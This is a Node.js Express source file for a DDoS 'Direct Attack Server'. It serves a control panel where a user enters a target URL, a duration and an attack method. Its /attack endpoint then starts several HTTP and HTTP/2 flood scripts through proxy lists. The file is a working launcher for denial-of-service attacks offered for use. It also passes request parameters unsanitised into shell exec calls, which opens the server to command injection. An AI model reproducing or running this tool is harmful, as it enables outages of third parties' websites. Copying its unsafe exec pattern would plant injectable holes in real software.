const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || 5552;

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log('\n========================================');
    console.log('🎮 Direct Attack Server Started!');
    console.log('========================================');
    console.log(`📍 Local:    http://localhost:${port}`);
    console.log(`🌐 Network:  http://${data.origin}:${port}`);
    console.log('========================================\n');
    return data;
  } catch (error) {
    console.log(`Server running at http://localhost:${port}`);
  }
}

// Serve Control UI
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Direct Attack Server</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
            50% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.8); }
        }
        .pulse-glow { animation: pulse-glow 2s infinite; }
    </style>
</head>
<body class="bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white min-h-screen">
    <!-- Header -->
    <div class="bg-black border-b border-red-900 shadow-lg">
        <div class="max-w-7xl mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-12 h-12 bg-gradient-to-br from-red-600 to-red-800 rounded-lg flex items-center justify-center pulse-glow">
                        <span class="text-2xl">⚡</span>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold bg-gradient-to-r from-red-500 to-purple-600 bg-clip-text text-transparent">
                            Direct Attack Server
                        </h1>
                        <p class="text-xs text-gray-400">Server Executes Attacks Directly</p>
                    </div>
                </div>
                <div class="text-right">
                    <div class="text-xs text-gray-500">Server Status</div>
                    <div class="flex items-center gap-2">
                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <span class="text-sm text-green-400 font-mono">Online</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="max-w-7xl mx-auto px-6 py-8">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <!-- Attack Control -->
            <div class="lg:col-span-2 space-y-6">
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-red-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            <span>⚔️</span> Launch Attack
                        </h2>
                    </div>
                    <div class="p-6 space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-300 mb-2">🎯 Target URL</label>
                            <input type="text" id="target" 
                                class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                placeholder="https://example.com">
                        </div>

                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="block text-sm font-medium text-gray-300 mb-2">⏱️ Duration (seconds)</label>
                                <input type="number" id="time" value="60" 
                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                    min="1">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-300 mb-2">💣 Attack Method</label>
                                <select id="method" 
                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
                                    <option>HTTP-SICARIO</option>
                                    <option>RAW-HTTP</option>
                                    <option>R9</option>
                                    <option>PRIV-TOR</option>
                                    <option>HOLD-PANEL</option>
                                    <option>R1</option>
                                </select>
                            </div>
                        </div>

                        <button onclick="launchAttack()" id="attackBtn" 
                            class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
                            🚀 Execute Attack
                        </button>

                        <div id="status" class="p-4 bg-gray-900 rounded-lg border border-gray-700 hidden">
                            <p class="text-sm"></p>
                        </div>
                    </div>
                </div>

                <!-- Activity Logs -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-purple-900/50 to-pink-900/50 px-6 py-4 border-b border-gray-700 flex items-center justify-between">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            <span>📊</span> Activity Logs
                        </h2>
                        <button onclick="clearLogs()" 
                            class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded transition-colors">
                            Clear
                        </button>
                    </div>
                    <div class="p-6">
                        <div id="logs" class="bg-gray-900 rounded-lg border border-gray-700 p-4 h-96 overflow-y-auto font-mono text-sm">
                            <p class="text-gray-500 text-center py-8">No activity yet...</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Sidebar -->
            <div class="space-y-6">
                <!-- Stats -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">📈 Statistics</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Active Attacks</span>
                            <span class="text-red-400 font-bold" id="activeAttacks">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Total Attacks</span>
                            <span class="text-green-400 font-bold" id="totalAttacks">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Uptime</span>
                            <span class="text-blue-400 font-bold" id="uptime">0s</span>
                        </div>
                    </div>
                </div>

                <!-- Available Methods -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">📋 Attack Methods</h3>
                    <div class="space-y-2 text-xs">
                        <div class="bg-gray-900 p-2 rounded border border-red-900/30">
                            <div class="text-red-400 font-bold">HTTP-SICARIO</div>
                            <div class="text-gray-500 text-xs mt-1">Multi-layer HTTP flood</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-orange-900/30">
                            <div class="text-orange-400 font-bold">RAW-HTTP</div>
                            <div class="text-gray-500 text-xs mt-1">Raw HTTP/2 attack</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-yellow-900/30">
                            <div class="text-yellow-400 font-bold">R9</div>
                            <div class="text-gray-500 text-xs mt-1">Mixed flood attack</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-green-900/30">
                            <div class="text-green-400 font-bold">PRIV-TOR</div>
                            <div class="text-gray-500 text-xs mt-1">Privacy-enhanced</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-blue-900/30">
                            <div class="text-blue-400 font-bold">HOLD-PANEL</div>
                            <div class="text-gray-500 text-xs mt-1">Panel hold attack</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-purple-900/30">
                            <div class="text-purple-400 font-bold">R1</div>
                            <div class="text-gray-500 text-xs mt-1">Full-spectrum</div>
                        </div>
                    </div>
                </div>

                <!-- API Info -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">🔗 API Endpoint</h3>
                    <div class="bg-gray-900 p-3 rounded-lg border border-gray-700">
                        <code class="text-xs text-green-400 break-all">/attack?target=URL&time=60&methods=METHOD</code>
                    </div>
                    <p class="text-xs text-gray-500 mt-2">Direct server execution</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let totalAttacks = 0;
        let activeAttacks = 0;
        let startTime = Date.now();

        setInterval(() => {
            const seconds = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = seconds % 60;
            document.getElementById('uptime').textContent = 
                hours > 0 ? \`\${hours}h \${minutes}m\` : \`\${minutes}m \${secs}s\`;
        }, 1000);

        function updateStats() {
            document.getElementById('totalAttacks').textContent = totalAttacks;
            document.getElementById('activeAttacks').textContent = activeAttacks;
        }

        async function launchAttack() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if (!target || !time) {
                addLog('❌ Error: Target and time required', 'error');
                return;
            }

            const btn = document.getElementById('attackBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = '⏳ Executing...';
            
            activeAttacks++;
            totalAttacks++;
            updateStats();

            addLog(\`🚀 Launching \${method} attack on \${target} for \${time}s\`, 'info');

            try {
                const response = await fetch(\`/attack?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
                const data = await response.json();
                
                if (response.ok) {
                    addLog(\`✅ Attack launched successfully!\`, 'success');
                    status.classList.remove('hidden');
                    status.querySelector('p').innerHTML = \`
                        <strong class="text-red-400">🔥 Active:</strong> 
                        <span class="text-white">\${target}</span> | 
                        <span class="text-yellow-400">\${method}</span> | 
                        <span class="text-green-400">\${time}s</span>
                    \`;
                    
                    setTimeout(() => {
                        activeAttacks = Math.max(0, activeAttacks - 1);
                        updateStats();
                        addLog(\`⏹️ Attack on \${target} completed\`, 'info');
                    }, parseInt(time) * 1000);
                } else {
                    addLog(\`❌ Error: \${data.error || 'Request failed'}\`, 'error');
                    activeAttacks = Math.max(0, activeAttacks - 1);
                    updateStats();
                }
            } catch (error) {
                addLog(\`❌ Network Error: \${error.message}\`, 'error');
                activeAttacks = Math.max(0, activeAttacks - 1);
                updateStats();
            } finally {
                btn.disabled = false;
                btn.textContent = '🚀 Execute Attack';
            }
        }

        function addLog(message, type = 'info') {
            const logsDiv = document.getElementById('logs');
            const timestamp = new Date().toLocaleTimeString();
            const icons = { info: '🔵', success: '✅', error: '❌' };
            const colors = { info: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
            
            if (logsDiv.querySelector('.text-gray-500')) {
                logsDiv.innerHTML = '';
            }
            
            const logEntry = document.createElement('div');
            logEntry.className = 'mb-2 pb-2 border-b border-gray-800';
            logEntry.innerHTML = \`
                <div class="flex items-start gap-2">
                    <span>\${icons[type]}</span>
                    <div class="flex-1">
                        <span class="text-gray-500 text-xs">[\${timestamp}]</span>
                        <span class="\${colors[type]} ml-2">\${message}</span>
                    </div>
                </div>
            \`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function clearLogs() {
            document.getElementById('logs').innerHTML = '<p class="text-gray-500 text-center py-8">No activity yet...</p>';
        }
    </script>
</body>
</html>
  `);
});

// Direct attack endpoint - server executes the methods
app.get('/attack', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters: target, time, methods'
    });
  }

  console.log(`\n[ATTACK] ${methods} -> ${target} for ${time}s`);

  res.status(200).json({
    message: 'Attack launched successfully from server',
    target,
    time,
    methods,
    server: 'executing'
  });

  const execWithLog = (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`[ERROR] ${error.message}`);
        return;
      }
      if (stdout) console.log(`[OUTPUT] ${stdout}`);
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
  };

  if (methods === 'HTTP-SICARIO') {
    console.log('✅ Executing HTTP-SICARIO');
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
  } 
  else if (methods === 'RAW-HTTP') {
    console.log('✅ Executing RAW-HTTP');
    execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } 
  else if (methods === 'R9') {
    console.log('✅ Executing R9');
    execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
  } 
  else if (methods === 'PRIV-TOR') {
    console.log('✅ Executing PRIV-TOR');
    execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
  } 
  else if (methods === 'HOLD-PANEL') {
    console.log('✅ Executing HOLD-PANEL');
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } 
  else if (methods === 'R1') {
    console.log('✅ Executing R1');
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
  }
});

app.listen(port, () => {
  fetchData();
});
